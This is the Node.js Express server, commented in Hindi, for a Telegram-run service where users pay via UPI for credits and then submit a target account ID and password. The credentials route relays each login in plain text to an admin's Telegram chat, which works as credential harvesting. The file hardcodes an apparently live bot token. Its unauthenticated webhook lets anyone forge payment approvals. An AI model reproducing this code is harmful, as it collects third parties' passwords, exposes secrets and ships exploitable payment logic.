const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());

// CORS एनेबल करें ताकि Vercel (फ्रंटएंड) से रिक्वेस्ट आसानी से आ सके
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

const BOT_TOKEN = '8787715855:AAF9PLZkk_tOb28TYcyTcAs_NszwURnzhkw';
const ADMIN_CHAT_ID = '7659178694';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// डेटाबेस (टेस्‍ट के लिए मेमोरी ऑब्जेक्ट, लाइव के लिए MongoDB/SQL इस्तेमाल करें)
const users = {}; 
const transactions = {}; 

const PRICING_PACKAGES = {
    'pack_1': { reaches: 1, price: 20 },
    'pack_3': { reaches: 3, price: 55 },
    'pack_6': { reaches: 6, price: 100 },
    'pack_14': { reaches: 14, price: 200 }
};

// यूज़र इनिशियलाइज़ेशन
app.post('/api/user/init', (req, res) => {
    const { telegramId, referrerId } = req.body;

    if (!users[telegramId]) {
        users[telegramId] = {
            telegramId,
            reaches: 0,
            referrerId: referrerId || null,
            totalRecharged: 0
        };
    }

    res.json({ success: true, user: users[telegramId], packages: PRICING_PACKAGES });
});

// पेमेंट अनुरोध (QR कोड स्कैन करने के बाद UTR सबमिट करने पर)
app.post('/api/request-purchase', async (req, res) => {
    const { telegramId, packageId, utrNumber } = req.body;
    const user = users[telegramId];
    const pkg = PRICING_PACKAGES[packageId];

    if (!user || !pkg) {
        return res.status(400).json({ error: 'अमान्य पैकेज या यूज़र।' });
    }

    const txId = 'TX' + Date.now();
    transactions[txId] = {
        txId,
        telegramId,
        packageId,
        reaches: pkg.reaches,
        price: pkg.price,
        utrNumber,
        status: 'Pending'
    };

    const messageText = `💳 **नया पेमेंट/रीचार्ज अनुरोध**\n\n` +
                        `**TxID:** \`${txId}\`\n` +
                        `**Telegram ID:** \`${telegramId}\`\n` +
                        `**पैकेज:** ${pkg.reaches} Reach (₹${pkg.price})\n` +
                        `**UTR / Transaction ID:** \`${utrNumber}\`\n\n` +
                        `कृपया भुगतान की जाँच करें:`;

    const inlineKeyboard = {
        inline_keyboard: [
            [
                { text: '✅ Approve & Add Reach', callback_data: `approve_${txId}` },
                { text: '❌ Reject', callback_data: `reject_${txId}` }
            ]
        ]
    };

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown',
            reply_markup: inlineKeyboard
        });

        res.json({ success: true, message: 'अनुरोध सफलतापूर्वक एडमिन के पास भेज दिया गया है।' });
    } catch (error) {
        res.status(500).json({ error: 'नोटिस भेजने में विफल।' });
    }
});

// आईडी और पासवर्ड सबमिशन
app.post('/api/submit-credentials', async (req, res) => {
    const { telegramId, targetId, targetPassword } = req.body;
    const user = users[telegramId];

    if (!user || user.reaches <= 0) {
        return res.status(400).json({ error: 'पर्याप्त रीच (Credits) मौजूद नहीं हैं। कृपया पहले रीचार्ज करें।' });
    }

    const subId = 'SUB' + Date.now();
    user.reaches -= 1; // 1 रीच कट जाएगी

    const messageText = `📥 **नया सबमिशन प्राप्त हुआ**\n\n` +
                        `**SubID:** \`${subId}\`\n` +
                        `**User ID:** \`${telegramId}\`\n` +
                        `**Credentials:** \`${targetId}\` / \`${targetPassword}\`\n\n` +
                        `**Status:** In Progress`;

    const inlineKeyboard = {
        inline_keyboard: [
            [
                { text: '✅ Completed', callback_data: `status_Completed_${subId}` },
                { text: '❌ Cancelled', callback_data: `status_Cancelled_${subId}` }
            ]
        ]
    };

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown',
            reply_markup: inlineKeyboard
        });

        res.json({ success: true, remainingReaches: user.reaches });
    } catch (error) {
        user.reaches += 1; 
        res.status(500).json({ error: 'समस्या आई, पुनः प्रयास करें।' });
    }
});

// Telegram Webhook (एडमिन के बटन क्लिक्स हैंडल करने के लिए)
app.post('/webhook', async (req, res) => {
    const { callback_query } = req.body;

    if (callback_query) {
        const data = callback_query.data;
        
        if (data.startsWith('approve_') || data.startsWith('reject_')) {
            const [action, txId] = data.split('_');
            const tx = transactions[txId];

            if (tx && tx.status === 'Pending') {
                const user = users[tx.telegramId];

                if (action === 'approve') {
                    tx.status = 'Approved';
                    user.reaches += tx.reaches;
                    user.totalRecharged += tx.price;

                    // रेफरल बोनस: ₹200 या अधिक के रिचार्ज पर रेफरर को 5 फ्री रीच
                    if (tx.price >= 200 && user.referrerId && users[user.referrerId]) {
                        users[user.referrerId].reaches += 5; 
                    }

                    await axios.post(`${TELEGRAM_API}/sendMessage`, {
                        chat_id: tx.telegramId,
                        text: `🎉 आपका ₹${tx.price} का रीचार्ज सफल हो गया है! आपके अकाउंट में ${tx.reaches} Reach जोड़ दिए गए हैं।`
                    });
                } else {
                    tx.status = 'Rejected';
                    await axios.post(`${TELEGRAM_API}/sendMessage`, {
                        chat_id: tx.telegramId,
                        text: `❌ आपका ₹${tx.price} का रीचार्ज अनुरोध अस्वीकार कर दिया गया है।`
                    });
                }

                await axios.post(`${TELEGRAM_API}/editMessageText`, {
                    chat_id: ADMIN_CHAT_ID,
                    message_id: callback_query.message.message_id,
                    text: callback_query.message.text + `\n\n*Status: ${tx.status}*`,
                    parse_mode: 'Markdown'
                });
            }
        }
    }

    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
